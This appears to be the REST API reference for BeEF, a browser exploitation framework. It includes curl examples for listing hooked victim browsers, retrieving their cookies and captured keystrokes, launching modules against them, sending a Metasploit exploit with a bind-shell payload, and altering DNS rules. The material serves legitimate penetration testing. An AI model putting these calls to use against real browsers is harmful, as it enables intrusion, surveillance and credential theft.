## Introduction
From version 0.4.3.3 onwards, BeEF exposes a RESTful API. This allows users to script BeEF through HTTP/JSON requests.

#### Table of Contents

- [Authentication](#authentication)
- [Hooked Browsers](#hooked-browsers)
- [Browser Details](#browser-details)
- [Logs](#logs)
- [Browser's Log](#browsers-log)
- [List Command Modules](#list-command-modules)
- [Information on a Specific Module](#information-on-a-specific-module)
- [Launch Command Module on a Specific Browser](#launch-command-module-on-a-specific-browser)
- [Return Information About the Specific Command Module Previously Executed](#return-information-about-the-specific-command-module-previously-executed)
- [Send a Metasploit Module](#send-a-metasploit-module)
- [Send a Module to Multiple Hooked Browsers](#send-a-module-to-multiple-hooked-browsers)
- [Send Multiple Modules to a Single Hooked Browser](#send-multiple-modules-to-a-single-hooked-browser)
- [List the DNS ruleset](#list-the-dns-ruleset)
- [List a Specific DNS Rule](#list-a-specific-dns-rule)
- [Add a New DNS Rule](#add-a-new-dns-rule)
- [Remove an Existing DNS Rule](#remove-an-existing-dns-rule)
- [Scripts](#scripts)

## Authentication

A new pseudo-random token is generated each time BeEF starts, using `BeEF::Core::Crypto::api_token`. The token is added to the `BeEF::Configuration` object.

When BeEF starts the token is printed to the console. It should look something like:

`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47`

**NOTE:**
* If require access to the token and you are writing Ruby code somewhere in BeEF, it can be called using:
```ruby
BeEF::Core::Configuration.instance.get('beef.api_token')
```

### Requesting the Authentication Token from the API
### Handler 

* **Endpoint** 
  * `POST /api/admin/login`
* **Description** 
  * In order to use the API, a `token` parameter must always be added to requests, otherwise a 401 error (Not Authorized) 
    is returned. This request provides that token in response.
  * The credentials sent in the body of the request are the ones set in the main [`config.yaml`](https://github.com/beefproject/beef/wiki/Command-Module-Config) file.
* **Request Components**
  * N/A
* **Query Parameters**
  * N/A
* **Request Content**
  * **Body**
    * `username` - your username set in [`beef/config.yaml`](https://github.com/beefproject/beef/wiki/Command-Module-Config)
    * `password` - your username set in [`beef/config.yaml`](https://github.com/beefproject/beef/wiki/Command-Module-Config)


### Example

#### Request 
```bash
curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login
```

#### Response
```
response: {"success":true,"token":"8dc651e5ee1cb06003878bb26bd0e72800caeea0"}
```

## Hooked Browsers

### Handler 

* **Endpoint** 
  * `GET /api/hooks?token={token}`
* **Description** 
  * Provides information (browser and OS version, cookies, enabled plugins, etc) about **all** hooked browsers (both 
    online and offline).
* **Request Components**
  * N/A
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))

### Example

#### Request 
```bash
curl http://beefserver.com:3000/api/hooks?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

#### Response
```
{
    "hooked-browsers": {
        "online": {
            "0": {
                "name": "FF",
                "version": "10",
                "os": "Intel Mac OS X 10.7",
                "platform": "MacIntel",
                "session": "nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
                "ip": "127.0.0.1",
                "domain": "127.0.0.1",
                "port": "3000",
                "page_uri": "http://127.0.0.1:3000/demos/basic.html"
            }
        },
        "offline": {
            "0": {
                "name": "C",
                "version": "17",
                "os": "Macintosh",
                "platform": "MacIntel",
                "session": "26bxiMKoFfOeBgcvIV84qeOsEULKQIEYDH4djMbMPeoAZU4yySMIlJJ7GrAMwuMa0eX9wCKk24KOsCoT",
                "ip": "127.0.0.1",
                "domain": "127.0.0.1",
                "port": "3000",
                "page_uri": "http://127.0.0.1:3000/demos/basic.html"
}}}}
```

## Browser Details

### Handler
* **Endpoint**
  * `GET /api/hooks/{session}?token={token}`
* **Description**
  * Provides information (browser and OS version, cookies, enabled plugins, etc) about a **specific** hooked browser.
* **Request Components** 
  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the [`/api/](#hooked-browsers) request.
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))

### Example

#### Request

```bash
curl http://beefserver.com:3000/api/hooks/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

#### Response

```
{ 
  "BrowserName": "O",
  "BrowserPlugins": "Shockwave Flash\nJava Applet Plug-in\nQuickTime Plug-in 7.7.1\nSharePoint Browser Plug-in\nSilverlight Plug-In\nWebEx64 General Plugin Container",
  "BrowserReportedName": "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.3; U; en) Presto/2.10.229 Version/11.62",
  "BrowserType": "{"O11":true,"O":true}",
  "BrowserVersion": "11",
  "Cookies": "BEEFHOOK=nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
  "HasActiveX": "No",
  "HasFlash": "Yes",
  "HasGoogleGears": "No",
  "HasWebSocket": "No",
  "HostName": "127.0.0.1",
  "JavaEnabled": "Yes",
  "OsName": "Macintosh",
  "PageReferrer": "No Referrer",
  "PageTitle": "BeEF Basic Demo",
  "PageURI": "http://127.0.0.1:3000/demos/basic.html",
  "ScreenParams": "{"width"=>1680, "height"=>1050, "colordepth"=>32}",
  "SystemPlatform": "MacIntel",
  "VBScriptEnabled": "No",
  "WindowSize": "{"width"=>1000, "height"=>729}",
  "hasPersistentCookies": "Yes",
  "hasSessionCookies": "Yes"
}
```

## Logs

### Handler

* **Endpoint**
  * GET `/api/logs?token={token}`
* **Description**
  * The `logs` handler gives information about **all** hooked browser's logs, both global and relative.
* **Request Components**
  * N/A  
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))

### Example

#### Request
```bash
curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

#### Response

```
{
    "logs_count": 8,
    "logs": [
        {
            "id": 1,
            "date": "2012-03-20T16:14:11+01:00",
            "event": "127.0.0.1 just joined the horde from the domain: 127.0.0.1:3000",
            "type": "Zombie"
        },
        {
            "id": 8,
            "date": "2012-03-20T16:18:27+01:00",
            "event": "19.092s - [Focus] Browser has regained focus.",
            "type": "Event"
        }
    ]
}
```

## Browser's Log

### Handler 
* **Endpoint**
  * `GET /api/logs/{session}?token={token}`
* **Description**
  * The `logs` handler gives information about a **specified** hooked browser's logs.
* **Request Components** : 
  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the [`/api/](#hooked-browsers) request.
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication)).

### Example

#### Request

```bash
curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

#### Response

```
{
    "logs_count": 13,
    "logs": [
        {
            "id": 1,
            "date": "2012-03-20T16:14:11+01:00",
            "event": "127.0.0.1 just joined the horde from the domain: 127.0.0.1:3000",
            "type": "Zombie"
        },
        {
            "id": 16,
            "date": "2012-03-20T16:40:18+01:00",
            "event": "6.071s - [User Typed] "an" > input#imptxt(Important Text)",
            "type": "Event"
        },
        {
            "id": 17,
            "date": "2012-03-20T16:40:19+01:00",
            "event": "7.086s - [User Typed] "tisnatc" > input#imptxt(Important Text)",
            "type": "Event"
        },
        {
            "id": 18,
            "date": "2012-03-20T16:40:20+01:00",
            "event": "8.099s - [User Typed] "hor" > input#imptxt(Important Text)",
            "type": "Event"
        }
    ]
}
```
## List Command Modules

### Handler
* **Endpoint**
  * `GET /api/modules?token={token}`
* **Description**
  * List **all** available BeEF command modules.
* **Request Components**
  * N/A
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication)).

### Example

#### Request 

```bash
curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

#### Response

```
{
    "0": {
        "id": 1,
        "name": "Linksys WRT54G CSRF",
        "category": "Router"
    },
    "65": {
        "id": 69,
        "name": "Redirect Browser (Rickroll)",
        "category": "Browser"
    },
    "66": {
        "id": 70,
        "name": "Replace Videos",
        "category": "Browser"
    },
    "67": {
        "id": 71,
        "name": "Create Prompt Dialog",
        "category": "Browser"
    }
}
```

## Information on a Specific Module

### Handler
* **Endpoint**
  * `GET /api/modules/{module_id}?token={token}`
* **Description**
  * Get detailed information about a **specific** BeEF command module.
* **Request Components** :
  * `{module_id}` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication)).

### Example


#### Request

```bash
curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

#### Response

```
{
    "name": "prompt_dialog",
    "description": "Sends a prompt dialog to the hooked browser.",
    "category": "Browser",
    "options": [
        {
            "name": "question",
            "description": "Prompt text",
            "ui_label": "Prompt text"
        }
    ]
}
```
## Launch Command Module on a Specific Browser

### Handler

* **Endpoint**
  * `POST /api/modules/{session}/{module_id}?token={token}`
* **Description**
  * Launch a **specific** BeEF command module against a **given** hooked browser.
* **Request Components**
  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the [`/api/](#hooked-browsers) request.
  * `{module_id}` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))
* **Request Content**
  * **Headers**
    * Content-Type: `application/json; charset=UTF-8`

### Example

In the following example we send the `prompt-dialog` command module. Using our last example (our `/api/modules/71` call), we can see that we can specify the `question` input with a custom value. 

**NOTE:** 
* The request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.

#### Request

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

#### Response

```
{
    "success": "true",
    "command_id": "1"
}
```
## Return Information About the Specific Command Module Previously Executed

### Handler
* **Endpoint**
  * `GET /api/modules/{session}/{module_id}/{cmd_id}?token={token}`
* **Description**
  * Returns information about a **specific** previously launched BeEF command module.
* **Request Components**
  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the [`/api/](#hooked-browsers) request.
  * `{module_id}` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
  * `{cmd_id}` - ID of the command launched. See [Launch Command Module](#launch-command-module-on-a-specific-browser).
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))

### Example 

Again using our previous example, we would like to know results from the executed command module i.e. what the victim entered to the prompt dialog. In this case the victim entered `don't know` :D

#### Request

```bash
curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

#### Response

```
{
    "date": "1332260323",
    "data": "{"data":"answer=don't know"}"
}
```

## Send a Metasploit Module

### Handler
* **Endpoint**
  * `POST /api/modules/{session}/{module_id}?token={token}`
* **Description**
  * Launch a **specific** Metasploit module against a **given** hooked browser
* **Request Components** :
  * `{session}` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the [`/api/](#hooked-browsers) request.
  * `{module_id}` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))
* **Request Content**
  * **Headers**
    * Content-Type: `application/json; charset=UTF-8`

### Example

In the following example we send the `Adobe FlateDecode Stream Predictor 02 Integer Overflow`. Metasploit modules will be listed together with BeEF modules, marked with the `metasploit` category.

**NOTE:** 
* The request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.

#### Request

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`
```

#### Response

**NOTE:** 
* You cannot query BeEF or Metasploit with [Return Information About A Command Module Previously Executed](#return-information-about-the-specific-command-module-previously-executed) call to historically check the result of an executed Metasploit module.
* This is why `"command_id":"not_available"` appears in the response of this request.

```
{
    "success": "true",
    "command_id": "not_available"
}
```

## Send a Module to Multiple Hooked Browsers

### Handler
* **Endpoint** 
  * `POST /api/modules/multi_browser?token={token}`
* **Description**
  * Fire a BeEF command module to **multiple** hooked browsers. Returns the command IDs of the launched module, or 0 if there were errors.
* **Request Components**
  * N/A
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))
* **Request Content**
  * **Headers**
    * Content-Type: `application/json; charset=UTF-8`
  * **Body**
    * `mod_id` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
    * `mod_params` - parameters needed for the module
    * `hb_ids` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the [`/api/](#hooked-browsers) request.

### Example
##### Sending an Alert Module w/ Custom Text to 2 Browsers

**NOTE:** 
* The request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.

#### Request

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"mod_id":110,"mod_params":{"text":"vadi?"},"hb_ids":[1,2]}' -X POST http://beefserver.com:3000/api/modules/multi?token=2316d82702b83a293e2d46a0886a003a6be0a633
```

#### Response

```
{
    "1": 16,
    "2": 17
}
```

## Send Multiple Modules to a Single Hooked Browser

### Handler
* **Endpoint**
  * `POST /api/modules/multi_module?token={token}`
* **Description**
  * Fire **multiple** command modules to a **single** hooked browser. Returns the command IDs of the launched modules, or 0 if there were errors.
* **Request Components**
  * N/A
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))
* **Request Content**
  * **Headers**
    * Content-Type: `application/json; charset=UTF-8`
  * **Body**
    * `hb` - session ID of the hooked browser. This ID is the `session_key` value returned in the response to the [`/api/](#hooked-browsers) request.
    * `modules` - an array containing all the modules to be launched, with the following two keys:
      * `mod_id` - ID of the BeEF module. See [List Command Modules](#list-command-modules).
      * `mod_input` - any ncessary module parameters.

### Example 
##### Alert Module w/ Custom Text Using 2 Modules

**NOTE:** 
* The request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON.
* For modules that don't need parameters, just pass an empty JSON object like {}.

#### Request

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"hb":"vkIwVV3ok5i5vH2f8sxlkoaKqAGKCbZXdWqE9vkHNFBhI8aBBHvtZAGRO2XqFZXxThBlmKlRiVwPeAzj","modules":[{"mod_id":99,"mod_input":[{"repeat":"10"},{"repeat_string":"ABCDE"}]},{"mod_id":116,"mod_input":[{"question":"hooked?"}]},{"mod_id":128,"mod_input":[]}]}' -X POST http://beefserver.com:3000/api/modules/multi_module?token=e640483ae9bca2eb904f003f27dd4bc83936eb92
```

#### Response

**NOTE:**
* Here that the Alert Dialog module execution had issues (i.e. it returns 0).

```
{
    "99": 7,
    "116": 8,
    "128": 0
}
```

## List the DNS ruleset

### Handler

* **Endpoint**
  * `GET /api/dns/ruleset?token={token}`
* **Description**
  * Returns the current set of DNS rules.
* **Request Components**
  * N/A
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))

### Example

#### Request

```bash
curl http://beefserver.com:3000/api/dns/ruleset?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

#### Response

```
{
    "count": 5,
    "ruleset": [
        {
            "id": "0605e3d",
            "pattern": "example.com",
            "type": "NS",
            "response": [
                "ns.example.com"
            ]
        },
        {
            "id": "7e64183",
            "pattern": "example.com",
            "type": "MX",
            "response": [
                10,
                "mail.example.com"
            ]
        },
        {
            "id": "a972452",
            "pattern": "ns.example.com",
            "type": "A",
            "response": [
                "10.0.2.15"
            ]
        },
        {
            "id": "0d28ff1",
            "pattern": "mail.example.com",
            "type": "A",
            "response": [
                "10.0.2.16"
            ]
        },
        {
            "id": "45ce397",
            "pattern": "example.com",
            "type": "HINFO",
            "response": [
                "M68000",
                "VMS"
            ]
        }
    ]
}
```

## List a Specific DNS Rule

### Handler

* **Endpoint**
  * `GET /api/dns/rule/{id}?token={token}`
* **Description** 
  * Returns an individual DNS rule given its unique id.
* **Request Components**
  * `{id}` - unique identifier associated with a **specific** DNS rule
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))

### Example

#### Request

```bash
curl http://beefserver.com:3000/api/dns/rule/7e64183?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

#### Response

```
{
    "id": "7e64183",
    "pattern": "example.com",
    "type": "MX",
    "response": [
        10,
        "mail.example.com"
    ]
}
```

## Add a New DNS Rule

### Handler

* **Endpoint**
  * `POST /api/dns/rule?token={token}`
* **Description**
  * Adds a new DNS rule or "resource record". Does nothing if rule is already present.
* **Request Comonents**
  * N/A
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))
* **Request Content** 
  * **Headers**
    * Content-Type: `application/json; charset=UTF-8`
  * **Body**
    * `pattern` - the query pattern to recognize.
    * `resource` - the resource record type (e.g. A, CNAME, NS, etc).
    * `response` - an array containing the response data.

### Example

#### Request

```bash
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"pattern": "example.com", "resource": "A", "response": [ "10.0.2.14" ]}' -X POST http://beefserver.com:3000/api/dns/rule?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

#### Response

```
{
    "success": true,
    "id": "01f458a"
}
```

## Remove an Existing DNS Rule

### Handler

* **Endpoint**
  * `DELETE /api/dns/rule/{id}?token={token}`
* **Description**
  * Removes an individual DNS rule with a **specified** unique ID.
* **Request Components** :
  * `{id}` - unique ID associated with the targeted rule.
* **Query Parameters**
  * `{token}` - your authentication token (see [Authentication](#authentication))

### Example

#### Request

```bash
curl -X DELETE http://beefserver.com:3000/api/dns/rule/45ce397?token=320f3cf4da7bf0df7566a517c5db796e73a23f47
```

#### Response

```
{
    "success": true
}
```

## Scripts
* [[Java-1.6.0u27 mass-pwner|Script:-Java-1.6.0u27-mass-pwner]]

***
[[Persistence|Persistence]] | [[Autorun Rule Engine|Autorun Rule Engine]]